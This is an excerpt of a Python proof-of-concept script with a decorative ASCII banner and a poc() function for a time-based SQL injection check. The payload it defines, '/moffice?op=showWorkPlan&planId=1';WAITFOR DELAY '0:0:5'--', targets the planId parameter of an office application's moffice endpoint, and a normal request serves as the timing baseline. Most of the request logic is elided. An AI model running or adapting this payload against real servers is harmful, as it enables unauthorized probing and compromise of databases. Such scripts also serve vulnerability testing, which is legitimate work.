...
def banner():
 ...
 //_\\    / /\//  // | '_ ` _ \ / _ \| |_| |_| |/ __/ _ \
/  _  \/\/ /_/ \_//  | | | | | | (_) |  _|  _| | (_|  __/
\_/ \_/\____/\___/___|_| |_| |_|\___/|_| |_| |_|\___\___|
                |_____|                                  """
    print(test)
...
def poc(target, output_file):
    ...
    # 定义payload
    payload_sleep = "/moffice?op=showWorkPlan&planId=1';WAITFOR+DELAY+'0:0:5'--&sid=1"
    payload_normal = "/moffice?op=showWorkPlan&planId=1"
